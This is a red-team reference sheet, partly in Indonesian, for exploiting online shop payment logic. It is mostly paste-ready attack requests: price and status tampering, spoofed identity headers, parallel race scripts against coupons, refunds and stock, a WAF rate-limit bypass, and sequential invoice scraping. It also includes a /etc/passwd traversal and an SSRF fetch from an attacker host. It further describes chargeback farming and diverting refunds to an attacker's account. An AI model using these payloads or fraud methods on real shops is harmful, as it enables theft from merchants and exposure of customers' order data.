# payment-logic — misc

# Payment & Commerce Logic — Red Team Reference

## 1. Attack Map

| Class | Primary Vector | Typical Endpoint | Impact |
|---|---|---|---|
| Price manipulation | hidden field, header, JSON mass-assign | `/cart`, `/checkout`, `/orders` | underpay, overpay-balance |
| Currency confusion | `currency` param, `Accept-Language`, locale cookie | `/price`, `/cart/add` | bayar IDR, terima USD |
| Coupon stacking | order-of-apply, race, case/alias | `/coupon/apply` | diskon >100% |
| Refund abuse | partial refund loop, multi-account, chargeback | `/refund`, `/return` | double-refund, saldo negatif |
| Race at checkout | TOCTOU stock/balance/coupon | `/checkout/confirm` | oversell, double balance |
| IDOR invoice/order | sequential ID, UUIDv1, header `X-User-Id` | `/invoice/{id}`, `/orders/{id}/pdf` | data leak, payment replay |

Reference targets: **nginx 1.25.x + PHP 8.3 / Node 20 + Postgres 16**, test browser **Chrome 131**, client **curl 8.12**, **Burp Suite 2024.x**, **Turbo Intruder**.

---

## 2. Price Manipulation

### 2.1 Hidden field tampering
Kirim:
```http
POST /cart/checkout HTTP/2
Host: shop.example.tld
Content-Type: application/x-www-form-urlencoded

item_id=4401&qty=1&price=100&price_cents=100&unit_price=100
```
Appears: `HTTP 302 /order/8821` with total `IDR 1,000`. Successful if the server uses `price` from the body, not DB lookup.

Detect mass-assign — send all candidates at once:
```
price=1&amount=1&total=1&subtotal=1&discount=100000&shipping=0&tax=0&currency=IDR&is_paid=true&status=paid
```
If `status=paid` is received, the order is paid in full without payment.

### 2.2 Header & cookie override
```bash
curl -ki https://shop.example.tld/api/v2/cart/checkout \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Internal: 1' \
  -H 'X-Original-Price: 100' \
  -b 'price_override=100; role=admin; debug=1' \
  --data 'sku=ABC&qty=1'
```
Lihat respons: `"total":100` → server mempercayai `price_override` cookie.

### 2.3 Negative quantity / negative price
```
qty=-1&price=250000
```
Total = `-250000` → credit balance. Check if checkout allows `total < 0` to the payment gateway; many gateways reject (`400 amount_invalid`) unless there is a `/topup` endpoint that reuses the cart.

### 2.4 Desimal & pembulatan (floating point)
Kirim:
```
qty=0.1&price=0.1
```
PHP Server `(int)($total*100)` → 0 or 1. Check DB consistency (NUMERIC) vs gateway (integer cents). Classic bug: total=0.00 when item is shipped, but stock is reduced.

### 2.5 Why it fails
- Server uses `sku` → DB lookup (common in Shopify, Magento 2.4.7).
- Gateway rejects `amount != server_amount` (Stripe `amount_mismatch`).
- CSRF + HMAC signature on the payload (common in Tokopedia/Shopee).

---

## 3. Currency Confusion

### 3.1 Parameter `currency`
```
POST /api/checkout
{"items":[{"sku":"TV-55","qty":1}],"currency":"IDR"}
```
Product valued at `USD 500`. Response: `"total":500,"currency":"IDR"` → pays Rp500, not Rp8 million.

Root cause: price stored without `currency_code`, or FX conversion only on the frontend.

### 3.2 Locale/cookie switch
```bash
curl -ki https://shop.example.tld/checkout \
  -b 'currency=IDR; locale=id-ID; country=ID' \
  --data 'sku=TV-55&qty=1'
```
Check if the `amount` response is recalculated or just a label. Compare with `Accept-Language: id-ID`.

### 3.3 Zero-decimal & 3-decimal mismatch
| Mata uang | Eksponen | Jebakan |
|---|---|---|
| JPY | 0 | send `100` for item ¥1000 |
| IDR | 0 (umum) | server anggap 2 desimal → Rp1 = 100 |
| KWD/BHD | 3 | rounding to 2 → 0.9% loss per txn |

Payload: `{"amount":1000,"currency":"JPY"}` vs `{"amount":1000,"currency":"IDR"}` — if both pass with the same total, there is an exponential bug.

### 3.4 Race: changing currency after price is displayed
Turbo Intruder, gate 2 request:
- Req A: `/cart/add sku=TV-55` with `currency=IDR`
- Req B: `/checkout/confirm` with `currency=USD`
If the line item does not store currency per line, the total is inconsistent.

### 3.5 Format lain
- `currency=IDR ` (trailing space) → fallback to default (often USD).
- `currency=idr` vs `IDR` — separate cache keys in Cloudflare/Akamai → mixed prices.

---

## 4. Coupon Stacking

### 4.1 Stack normal (harusnya mutual exclusion)
```
POST /coupon/apply {"code":"WELCOME10"}  → 200
POST /coupon/apply {"code":"WELCOME10"}  → 200 (double apply)
POST /coupon/apply {"code":"FREESHIP"}   → 200
POST /coupon/apply {"code":"CASHBACK"}   → 200
GET  /cart → discount 4x
```
Check if the second `POST` returns "already applied" or adds another `discount`. Many systems store `coupon[]` in the session without deduplication.

### 4.2 Case & whitespace alias
`WELCOME10`, `welcome10`, `Welcome10`, `WELCOME10 ` (spasi), `WELCOME-10`, `ＷELCOME10` (fullwidth). Kalau lolos 2+ kali → bug dedup case-sensitive.

### 4.3 Race condition (coupon single-use)
Turbo Intruder, 50 request paralel, gate 2 (`X-RaceGate`):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=50, engine=Engine.HTTP2)
    for i in range(50):
        engine.queue(target.req, gate='g1')
    engine.openGate('g1')
```
Coupon `SINGLE50` (limit 1) → percentage 200 OK > 1 → coupon leak. In Postgres 16, this happens when `SELECT ... FOR UPDATE` is not used.

### 4.4 Reuse via user enumeration
- `/coupon/claim` with different `X-User-Id` header, or `user_id` in the body — check for IDOR to other users' coupons.
- Duplicate account: email `a+1@x.tld` vs `a@x.tld` — does the server normalize? If not, one person claims 10x.

### 4.5 Order-of-apply
Kombinasi:
1. Apply `CASHBACK100` (nominal) → total 100000
2. Apply `PERCENT50` → calculated from 100000, not 200000
3. Remove `CASHBACK` → is `PERCENT50` recomputed or fixed?
Send sequence, snapshot `/cart` at each step.

### 4.6 Integer overflow / negatif
`discount=100000` on cart 50000 → total -50000. See if checkout blocks or automatically creates a refund balance.

---

## 5. Refund Abuse

### 5.1 Double refund
```
POST /refund {"order_id":8821,"amount":50000,"reason":"item_defect"}
POST /refund {"order_id":8821,"amount":50000,"reason":"not_received"}
```
Jika idempoten salah → 2x refund. Cek header `Idempotency-Key`:
```bash
curl -X POST https://shop.example.tld/refund \
  -H 'Idempotency-Key: ' \
  -d '{"order_id":8821,"amount":50000}'
```
Empty key ≠ reused key. Many examples: key created client-side, uniqueness not checked with the endpoint.

### 5.2 Partial refund loop
Order 100000, refund 3x `amount=40000`. Total 120000 > 100000. Cek apakah server tracking `refunded_total`.

### 5.3 Refund to different methods
Order paid via credit card, refund requested to **e-wallet** / **bank account**. If the server does not bind refund method = payment method, the balance can be withdrawn to the attacker's account (common marketplace fraud case).

### 5.4 Refund race
Turbo Intruder 20x parallel to `/refund` with `amount=100000`, order 100000. Expectation: 1 success. Reality: `refunded_total` is calculated non-atomically (`SELECT sum THEN INSERT`) → N successes.

### 5.5 Return without item
- `POST /return` with `item_id` from another order (IDOR) → return accepted, refund to original order.
- Manipulation of `tracking_no` (free format) → auto-approval if there is an unverified courier integration.

### 5.6 Chargeback farming
Not a technical technique but operational: specific virtual BIN cards + `billing_country` mismatch, refund on the merchant side to avoid chargeback fees. Scale requires many accounts — see §8.

---

## 6. Race Condition at Checkout

### 6.1 Oversell stok
Turbo Intruder, 100 paralel, single packet attack:
```http
POST /checkout/confirm HTTP/2
Host: shop.example.tld
Content-Type: application/json

{"cart_id":"c_1","sku":"LIMITED","qty":1}
```
Gate 2 waits for all in-flight. If stock=1 but 2+ `200 order_created` → `UPDATE stock = stock - 1 WHERE stock >= 1` is not atomic, or isolation `READ COMMITTED` + ORM `save()`.

### 6.2 Double-spend saldo
Balance 100000, two parallel requests `POST /wallet/pay amount=100000` for two orders. If the final balance is -100000 → race.

### 6.3 Race in coupon + cart application
- Coupon applicator and checkout are two separate transactions without row lock.
- Client sends checkout twice (double click) with the same `Idempotency-Key` → check server deduplication.

### 6.4 Last-byte sync (HTTP/2)
To bypass WAF rate-limits (Cloudflare/Imperva), use last-byte synchronization in Turbo Intruder:
```python
engine = RequestEngine(endpoint=target.endpoint,
                       engine=Engine.HTTP2,
                       concurrentConnections=1)
for i in range(50):
    engine.queue(target.req, gate='lb')
```
Send all requests in 1 connection, hold the last byte. WAF often only counts full requests → burst succeeds.

### 6.5 Why it fails
- `SELECT ... FOR UPDATE` / `SERIALIZABLE` with retry.
- Redis `SETNX` lock per SKU (many small e-commerce sites are wrong: using `SET` instead of `SET NX`).
- Rate-limit in nginx `limit_req zone=checkout burst=2 nodelay` (nginx 1.25) → not fixing the race, only slowing it down.

---

## 7. IDOR in Invoice / Order

### 7.1 Sequential integer
```
GET /invoice/1001  (milik Anda)
GET /invoice/1002  (milik orang lain)
GET /invoice/1003
```
Test with accounts A and B. Fast response vs `403` — timing difference of ~10ms indicates the object exists but is unauthorized.

### 7.2 UUIDv1 & time correlation
If the ID `f47ac10b-58cc-11ed-...` (v1), the node timestamp is mixed. Forecast IDs with `uuid-forecaster`; many endpoints like `/orders/{uuid}/pdf` only authorize via "UUID is not guessable" — this is wrong.

### 7.3 Header & parameter override
```bash
curl -ki 'https://shop.example.tld/api/orders/1002' \
  -H 'X-User-Id: 1001' \
  -H 'X-Account-Id: 1001' \
  -H 'X-Forwarded-User: 1001'
```
Many joint reverse proxies (e.g. `oauth2-proxy`, `traefik-forward-auth`) forward the user header from upstream — if `trust_forwarded_headers=true` without stripping client headers, IDOR is trivial.

### 7.4 Nested & mass-assign
```
GET /api/orders/1002?include=payment,shipping,user
PATCH /api/orders/1002 {"user_id":1001}
```
`user_id` in the body → ownership transfer (often in Laravel `$fillable` that is too loose).

### 7.5 Invoice PDF generation
`GET /invoice/1002/pdf?template=../../etc/passwd` (path traversal in the template) or `template=http://attacker/tpl` (SSRF). Also check the `Content-Disposition` header — if `filename` can be controlled, there is stored XSS in the PDF viewer (Chrome 131 closes SVG in PDF, but HTML widgets in older viewers still work).

### 7.6 Guest order token
Guest orders have a token in the URL: `/orders/abc123/view?email=x@y.tld`. If the token in the body can be guessed or isn't bound to the email → IDOR. Test with empty `token`, `token=null`, `token=0`.

### 7.7 Mass enumeration
Turbo Intruder to `/invoice/{n}` with n = 1000..2000, filter by `200` + `Content-Length`. Save the PDF for parsing.

---

## 8. Field Operational Pitfalls

| Jebakan | Gejala | Mitigasi uji |
|---|---|---|
| **Race fails due to TCP/keepalive** | 50 requests but serial results | Use HTTP/2 single connection + last-byte, or HTTP/1.1 pipeline in Burp |
| **WAF rate-limit disguised as 429** | “Race failed”, when in fact the request never reached origin | First test 1 request + random `X-Forwarded-For`; check the `cf-ray` / `x-akamai-*` headers |
| **Cache (CDN) menyajikan harga lain** | Currency confusion inkonsisten | Sertakan `Cache-Control: no-store`, `Vary` test; cek `Age:` header |
| **Feature flag / A-B test** | Bug only in 10% of sessions | Send `Cookie: ab_bucket=test`, or repeat 100x and record variations |
| **Idempotency-Key from client** | Double refund fails due to middleware cache | Try without the header, with a random key per request |
| **Gateway sandbox vs prod** | Amount mismatch in prod | Test with a small amount (1000), not 1 |
| **Email/SMS OTP** | Coupon race makes OTP expire | Avoid full checkout; focus on the `/cart` and `/coupon` endpoints |
| **Server decimal locale** | `0,5` vs `0.5` in PHP `setlocale` | Send both |
| **Postgres `READ COMMITTED` default** | Race passes in dev (SQLite!) but not in prod | Confirm the DB stack from the error page/timing |
| **Time-skew UUIDv4** | Forecast fails | Use another regex-generator; v4 can't be predicted |
| **nginx `limit_req` blocks burst** | Race works at origin but dies at the edge | Lower concurrency to the `burst` limit, or find another path without a limit |
| **Cookie `SameSite=Strict`** | CSRF-based price tampering fails | Send a same-site request via subdomain takeover or open redirect |
| **Chrome 131 third-party cookie phase-out** | Session fix in payment iframe fails | Test with `--disable-features=TrackingProtection3p` |
| **Stock pre-allocated in Redis** | Race oversell doesn't show up in the DB | Monitor Redis `DECR` vs DB, test both layers |
| **Refund to original method only** | Refund to wallet fails | Check `/refund/method` or the topup endpoint |
| **App-level lock per user** | Race per-user tak muncul | Ubah `user_id`/`device_id`, coba dua akun paralel |

---

## 9. Checklist Request Cepat (siap tempel)

```bash
# 1. Price tamper
curl -ki https://T/api/cart/checkout -H 'Content-Type: application/json' \
  -d '{"sku":"X","qty":1,"price":1,"currency":"IDR"}'

# 2. Currency
curl -ki https://T/api/checkout -H 'Content-Type: application/json' \
  -d '{"sku":"TV","qty":1,"currency":"IDR"}'

# 3. Coupon double
for c in WELCOME10 welcome10 'WELCOME10 ' ; do
  curl -ki -b jar -c jar https://T/coupon/apply --data-urlencode "code=$c"
done

# 4. Refund idempotency kosong
curl -ki -X POST https://T/refund -H 'Idempotency-Key;' \
  -d 'order_id=1&amount=1'

# 5. IDOR invoice
for i in $(seq 1000 1010); do
  curl -kso /dev/null -w "%{http_code} %{size_download} $i\n" https://T/invoice/$i
done
```

---

## 10. Angka Rujukan

- Chrome 131: `Set-Cookie` without `SameSite` defaults to `Lax`; `Partitioned` requires `Secure`.
- nginx 1.25: `limit_req_zone $binary_remote_addr zone=co:10m rate=5r/s;` — burst default 0 bila tak diset.
- Postgres 16: default `default_transaction_isolation = read committed`; `SERIALIZABLE` retry is mandatory.
- Stripe API `2024-06-20`: `amount` integer in minor units; mismatch → `400 amount_mismatch`.
- PHP 8.3: `float` 0.1+0.2 = 0.30000000000000004; `bcmath`/`intdiv` disarankan.
- MySQL 8.0.36 / MariaDB 11: `DECIMAL` is safe; `FLOAT` is not.

---

## [reasoning trace]


